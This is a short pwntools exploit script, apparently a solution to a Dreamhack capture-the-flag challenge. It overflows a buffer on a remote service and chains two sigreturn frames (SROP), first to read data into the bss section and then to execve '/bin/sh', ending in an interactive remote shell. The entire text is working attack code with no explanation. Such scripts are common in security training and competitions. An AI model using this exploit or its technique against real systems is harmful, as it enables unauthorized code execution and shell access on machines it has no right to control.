from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 23055
r = remote(HOST, PORT)

bss = 0x601030
pop_rax_syscall = 0x4004eb
syscall = 0x4004ec

frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = bss
frame.rdx = 0x400
frame.rip = syscall
frame.rsp = bss+8

payload = flat([
    pop_rax_syscall,
    0xf,
    frame
])
r.sendline(b'A'*0x18 + payload)

frame = SigreturnFrame()
frame.rax = 0x3b
frame.rdi = bss
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

payload = flat([
    b'/bin/sh\x00',
    pop_rax_syscall,
    0xf,
    frame
])
r.sendline(payload)

r.interactive()